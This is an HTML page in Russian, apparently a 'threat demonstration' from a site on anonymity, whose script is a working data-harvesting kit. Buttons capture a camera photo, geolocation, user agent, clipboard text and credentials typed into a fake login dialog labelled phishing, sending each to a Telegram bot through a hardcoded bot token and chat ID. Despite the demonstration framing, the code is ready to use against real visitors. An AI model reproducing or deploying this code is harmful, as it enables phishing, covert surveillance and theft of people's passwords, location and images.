<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>–£–≥—Ä–æ–∑—ã –∏ –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ</title>
<link rel="stylesheet" href="styles.css" />
<style>
  body {
    background: #0f172a;
    color: #e0f2fe;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0; padding: 0;
  }
  header {
    background: #1e293b;
    padding: 1rem 2rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    box-shadow: 0 4px 10px rgba(0,0,0,0.5);
  }
  .menu a {
    color: #60a5fa;
    margin: 0 1rem;
    text-decoration: none;
    font-weight: 600;
    transition: color 0.3s;
  }
  .menu a:hover {
    color: #38bdf8;
  }
  main {
    max-width: 900px;
    margin: 2rem auto;
    padding: 0 1rem;
  }
  h1 {
    text-align: center;
    color: #38bdf8;
    margin-bottom: 1rem;
    font-weight: 700;
    letter-spacing: 1.5px;
  }
  .btn {
    background: #1e40af;
    border: none;
    padding: 15px 25px;
    margin: 10px;
    border-radius: 8px;
    color: #e0f2fe;
    font-size: 1.1rem;
    font-weight: 600;
    cursor: pointer;
    box-shadow: 0 4px 15px #3b82f6aa;
    transition: background 0.3s ease, transform 0.2s ease;
  }
  .btn:hover {
    background: #2563eb;
    transform: scale(1.05);
  }
  #log {
    background: #1e293b;
    border-left: 6px solid #3b82f6;
    padding: 1rem;
    margin-top: 2rem;
    border-radius: 10px;
    max-height: 200px;
    overflow-y: auto;
    font-family: monospace;
    font-size: 0.9rem;
    color: #64ffda;
    box-shadow: 0 0 12px #38bdf8;
  }
  /* –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ */
  #loginModal {
    display: none;
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: #1e293b;
    border: 2px solid #38bdf8;
    padding: 20px 30px;
    border-radius: 10px;
    box-shadow: 0 0 25px #38bdf8;
    z-index: 1000;
    width: 320px;
  }
  #loginModal input {
    width: 100%;
    padding: 10px;
    margin: 8px 0;
    border-radius: 6px;
    border: 1px solid #3b82f6;
    background: #0f172a;
    color: #e0f2fe;
    font-size: 1rem;
  }
  #loginModal button {
    width: 100%;
    margin-top: 10px;
  }
  #overlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(15,23,42,0.75);
    z-index: 900;
  }
</style>
</head>
<body>

<header>
  <div class="logo" style="color:#38bdf8; font-weight:700; font-size:1.5rem;">–ê–Ω–æ–Ω–∏–º–Ω–æ—Å—Ç—å & –£–≥—Ä–æ–∑—ã</div>
  <nav class="menu">
    <a href="index.html">–ì–ª–∞–≤–Ω–∞—è</a>
    <a href="memo.html">–ü–∞–º—è—Ç–∫–∞</a>
    <a href="threats.html" style="color:#60a5fa; border-bottom: 2px solid #60a5fa;">–£–≥—Ä–æ–∑—ã</a>
  </nav>
</header>

<main>
  <h1>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –£–≥—Ä–æ–∑ –∏ –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ</h1>

  <button class="btn" onclick="sendPing()">–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–≤—è–∑–∏ —Å Telegram</button>
  <button class="btn" onclick="requestCamera()">–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã</button>
  <button class="btn" onclick="logLocation()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é</button>
  <button class="btn" onclick="logUserAgent()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å User-Agent</button>
  <button class="btn" onclick="showLoginModal()">–í–æ–π—Ç–∏ (–§–∏—à–∏–Ω–≥)</button>
  <button class="btn" onclick="captureClipboard()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
  <button class="btn" onclick="uploadFakeFile()">–ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª (–§–∏—à–∏–Ω–≥)</button>

  <div id="log" aria-live="polite" aria-atomic="true"></div>
</main>

<div id="overlay"></div>
<div id="loginModal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
  <h2 id="loginTitle" style="color:#38bdf8; text-align:center; margin-bottom: 10px;">–í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç</h2>
  <input type="text" id="loginInput" placeholder="Email –∏–ª–∏ –ª–æ–≥–∏–Ω" autocomplete="username" />
  <input type="password" id="passwordInput" placeholder="–ü–∞—Ä–æ–ª—å" autocomplete="current-password" />
  <button class="btn" onclick="captureCredentials()">–í–æ–π—Ç–∏</button>
  <button class="btn" style="background:#ef4444; margin-top:5px;" onclick="closeLoginModal()">–û—Ç–º–µ–Ω–∞</button>
</div>

<script>
  const BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
  const CHAT_ID = '7408565938';

  const logElem = document.getElementById('log');
  const overlay = document.getElementById('overlay');
  const loginModal = document.getElementById('loginModal');

  function addToLog(text) {
    const time = new Date().toLocaleTimeString();
    logElem.textContent = `[${time}] ${text}\n` + logElem.textContent;
  }

  async function sendToTelegram(message) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
      addToLog("–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram.");
    } catch(e) {
      addToLog("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram: " + e.message);
    }
  }

  function sendPing() {
    const msg = `üü¢ –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–≤—è–∑–∏:\nIP: ${getIP()}\nUser-Agent: ${navigator.userAgent}`;
    sendToTelegram(msg);
    addToLog("–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–≤—è–∑–∏.");
  }

  // –ü–æ–ª—É—á–∏—Ç—å IP (–ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ –≤–Ω–µ—à–Ω–∏–π —Å–µ—Ä–≤–∏—Å, fallback - "–ù–µ —É–¥–∞–ª–æ—Å—å")
  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch {
      return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP";
    }
  }

  async function requestCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);
      video.srcObject = stream;
      video.play();

      // –°–¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
      setTimeout(async () => {
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 320, 240);
        video.pause();
        stream.getTracks().forEach(track => track.stop());
        video.remove();

        const dataURL = canvas.toDataURL('image/png');
        const blob = dataURItoBlob(dataURL);

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.png');
        formData.append('caption', 'üì∏ –§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã (–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —É–≥—Ä–æ–∑)');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        addToLog('–§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
      }, 3000);
    } catch(e) {
      addToLog('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ –∏–ª–∏ –æ—Ç–∫–∞–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è');
      sendToTelegram(`üö® –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ: ${e.message}`);
    }
  }

  function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for(let i=0; i<byteString.length; i++) {
      ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], {type: mimeString});
  }

  async function logLocation() {
    if (!navigator.geolocation) {
      addToLog('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
      return;
    }
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const coords = pos.coords;
      const msg = `üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n–®–∏—Ä–æ—Ç–∞: ${coords.latitude}\n–î–æ–ª–≥–æ—Ç–∞: ${coords.longitude}\n–¢–æ—á–Ω–æ—Å—Ç—å: ${coords.accuracy}–º`;
      await sendToTelegram(msg);
      addToLog('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞');
    }, (err) => {
      addToLog('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ' + err.message);
      sendToTelegram(`üö® –û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ${err.message}`);
    });
  }

  function logUserAgent() {
    const msg = `üß≠ User-Agent:\n${navigator.userAgent}`;
    sendToTelegram(msg);
    addToLog('User-Agent –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
  }

  function showLoginModal() {
    loginModal.style.display = 'block';
    overlay.style.display = 'block';
  }

  function closeLoginModal() {
    loginModal.style.display = 'none';
    overlay.style.display = 'none';
  }

  function captureCredentials() {
    const login = document.getElementById('loginInput').value.trim();
    const pass = document.getElementById('passwordInput').value.trim();

    if (!login || !pass) {
      alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å');
      return;
    }

    const msg = `üé£ –§–∏—à–∏–Ω–≥ –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å:\n–õ–æ–≥–∏–Ω: ${login}\n–ü–∞—Ä–æ–ª—å: ${pass}\nUser-Agent: ${navigator.userAgent}`;
    sendToTelegram(msg);
    addToLog('–§–∏—à–∏–Ω–≥–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã');
    closeLoginModal();
  }

  // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ (–º–æ–∂–µ—Ç –Ω–µ —Ä–∞–±–æ—Ç–∞—Ç—å –±–µ–∑ HTTPS)
  async function captureClipboard() {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        const msg = `üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞:\n${text}`;
        sendToTelegram(msg);
        addToLog('–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
      } else {
        addToLog('–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø—É—Å—Ç');
      }
    } catch (e) {
      addToLog('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞');
      sendToTelegram(`üö® –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞: ${e.message}`);
    }
  }

  // –§–µ–π–∫–æ–≤–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Ñ–∏—à–∏–Ω–≥–∞
  function uploadFakeFile() {
    const fakeFileName = 'invoice_2025.pdf';
    const msg = `üìÅ –§–∏—à–∏–Ω–≥–æ–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª: ${fakeFileName}\nUser-Agent: ${navigator.userAgent}`;
    sendToTelegram(msg);
    addToLog(`–§–∏—à–∏–Ω–≥–æ–≤–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ (${fakeFileName}) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞`);
  }
</script>

</body>
</html>
